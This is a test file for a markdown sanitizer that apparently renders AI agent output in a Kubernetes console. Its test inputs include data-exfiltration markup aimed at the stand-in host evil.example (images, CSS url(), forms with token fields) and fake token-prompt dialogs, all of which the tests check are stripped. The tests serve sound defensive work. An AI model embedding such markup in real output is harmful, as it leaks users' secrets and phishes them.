// @vitest-environment jsdom
import { describe, expect, it } from 'vitest';

import { renderMarkdown, renderMarkdownInline } from './markdown';

const url = 'https://evil.example/leak.png?secret=abc';

describe('renderMarkdown', () => {
  it('renders basic markdown', () => {
    const html = renderMarkdown('**bold** [link](https://example.com)\n\n- item');
    expect(html).toContain('<strong>bold</strong>');
    expect(html).toContain('<li>item</li>');
  });

  it('opens links in a new tab', () => {
    expect(renderMarkdown('[link](https://example.com)')).toContain(
      '<a href="https://example.com" target="_blank" rel="noopener noreferrer">link</a>',
    );
  });

  it('removes download from links, which would save files with agent-chosen names', () => {
    const html = renderMarkdown(
      '<a href="/api/kubernetes/api/v1/namespaces/ns/pods/p/log" download="fix.sh">fix</a>',
    );
    expect(html).not.toContain('download');
  });

  it('keeps table column alignment', () => {
    expect(renderMarkdown('| a |\n|:-:|\n| 1 |')).toContain('<td align="center">1</td>');
  });

  it('renders task list checkboxes as text', () => {
    expect(renderMarkdown('- [x] done\n- [ ] todo')).toBe(
      '<ul>\n<li>☑ done</li>\n<li>☐ todo</li>\n</ul>\n',
    );
  });

  it('renders loose task list checkboxes as text', () => {
    expect(renderMarkdown('- [x] done\n\n- [ ] todo')).toBe(
      '<ul>\n<li><p>☑ done</p>\n</li>\n<li><p>☐ todo</p>\n</li>\n</ul>\n',
    );
  });

  it('keeps link titles', () => {
    expect(renderMarkdown('[link](https://example.com "Title")')).toContain('title="Title"');
  });

  it('keeps ordered list start numbers', () => {
    expect(renderMarkdown('3. item')).toContain('<ol start="3">');
  });

  it('keeps collapsible sections', () => {
    expect(renderMarkdown('<details open><summary>Logs</summary>\n\ntext\n\n</details>')).toContain(
      '<details open=""><summary>Logs</summary>',
    );
  });

  it('keeps inline formatting tags', () => {
    const markdown = '<b>bold</b> <i>italic</i> <s>struck</s> <u>underlined</u>';
    expect(renderMarkdown(markdown)).toBe(`<p>${markdown}</p>\n`);
  });

  it('keeps semantic inline tags', () => {
    const markdown =
      '<del>old</del> <ins>new</ins> <mark>key</mark> <small>note</small> <samp>error</samp> <var>name</var>';
    expect(renderMarkdown(markdown)).toBe(`<p>${markdown}</p>\n`);
  });

  it('keeps definition lists', () => {
    expect(renderMarkdown('<dl><dt>Term</dt><dd>Definition</dd></dl>')).toBe(
      '<dl><dt>Term</dt><dd>Definition</dd></dl>',
    );
  });

  it('keeps divs, so their contents stay on separate lines', () => {
    expect(renderMarkdown('<div>Step one</div><div>Step two</div>')).toBe(
      '<div>Step one</div><div>Step two</div>',
    );
  });

  it('keeps table captions and footers', () => {
    const html = renderMarkdown(
      '<table><caption>Pods</caption><tbody><tr><td>a</td></tr></tbody>' +
        '<tfoot><tr><td>Total</td></tr></tfoot></table>',
    );
    expect(html).toContain('<caption>Pods</caption>');
    expect(html).toContain('<tfoot><tr><td>Total</td></tr></tfoot>');
  });

  it('removes tags not on the allow list but keeps their text', () => {
    expect(renderMarkdown('<span>text</span>')).toBe('<p>text</p>\n');
  });

  it('removes attributes not on the allow list', () => {
    expect(renderMarkdown('<p popover="manual" title="Title">text</p>')).toBe(
      '<p title="Title">text</p>',
    );
  });

  it.each([
    ['markdown image', `![alt](${url})`],
    ['img src', `<img src="${url}">`],
    ['img srcset', `<img srcset="${url} 1x">`],
    ['picture source', `<picture><source srcset="${url}"></picture>`],
    ['video poster', `<video poster="${url}"></video>`],
    ['video src', `<video src="${url}"></video>`],
    ['audio src', `<audio src="${url}"></audio>`],
    ['svg image', `<svg><image href="${url}"></image></svg>`],
    ['input image', `<input type="image" src="${url}">`],
    ['style attribute', `<span style="background:url(${url})">text</span>`],
    ['style element', `text\n\n<style>p{background:url(${url})}</style>`],
    ['table background', `<table background="${url}"><tr><td>cell</td></tr></table>`],
  ])('removes external resource loads (%s)', (_, markdown) => {
    expect(renderMarkdown(markdown)).not.toContain('evil.example');
  });

  it('removes style elements', () => {
    expect(renderMarkdown('text\n\n<style>p{color:red}</style>')).not.toContain('<style');
  });

  it('removes forms', () => {
    const html = renderMarkdown(
      `text\n\n<form action="${url}"><input name="token"><button>Go</button></form>`,
    );
    expect(html).not.toContain('<form');
    expect(html).not.toContain('evil.example');
  });

  it.each([
    ['button', '<button>Approve</button>', '<button'],
    ['input checkbox', '<input type="checkbox" checked>', '<input'],
    ['input password', '<input type="password" title="Re-enter your token">', '<input'],
    ['input submit', '<input type="submit">', '<input'],
    ['select', '<select><option>a</option></select>', '<select'],
    ['textarea', '<textarea>token</textarea>', '<textarea'],
  ])('removes form controls (%s)', (_, markdown, tag) => {
    expect(renderMarkdown(`text\n\n${markdown}`)).not.toContain(tag);
  });

  it('removes dialogs, which would overlay the page', () => {
    expect(
      renderMarkdown('text\n\n<dialog open><p>Session expired. Re-enter your token.</p></dialog>'),
    ).not.toContain('<dialog');
  });

  it.each([
    ['command', '<p command="show-modal" commandfor="dialog">text</p>'],
    ['popovertarget', '<p popovertarget="popover">text</p>'],
  ])('removes attributes that control other page elements (%s)', (_, markdown) => {
    const html = renderMarkdown(`text\n\n${markdown}`);
    expect(html).not.toMatch(/command|popovertarget/);
  });

  it('removes classes, which would apply console styles', () => {
    const html = renderMarkdown(
      'text\n\n<div class="pf-v6-c-backdrop"><div class="pf-v6-c-modal-box">Re-enter your token</div></div>',
    );
    expect(html).not.toContain('class=');
  });

  it('removes classes from fenced code blocks', () => {
    expect(renderMarkdown('```js\nfoo\n```')).toContain('<pre><code>foo');
  });

  it.each([
    ['id', '<div id="content">text</div>', 'id='],
    ['name', '<a href="https://example.com" name="top">link</a>', 'name='],
  ])('removes attributes that could collide with page elements (%s)', (_, markdown, attr) => {
    expect(renderMarkdown(`text\n\n${markdown}`)).not.toContain(attr);
  });

  it('removes data attributes, which could match page selectors', () => {
    expect(renderMarkdown('text\n\n<div data-test="approve-button">text</div>')).not.toContain(
      'data-',
    );
  });

  it.each([
    ['aria', '<div aria-label="Approved" aria-live="assertive">Denied</div>', 'aria-'],
    ['role', '<div role="alertdialog">Re-enter your token</div>', 'role='],
  ])('removes attributes that could mislead assistive technology (%s)', (_, markdown, attr) => {
    expect(renderMarkdown(`text\n\n${markdown}`)).not.toContain(attr);
  });
});

describe('renderMarkdownInline', () => {
  it('renders inline markdown without a paragraph', () => {
    expect(renderMarkdownInline('**bold**')).toBe('<strong>bold</strong>');
  });

  it('removes images', () => {
    expect(renderMarkdownInline(`text ![alt](${url})`)).toBe('text ');
  });
});
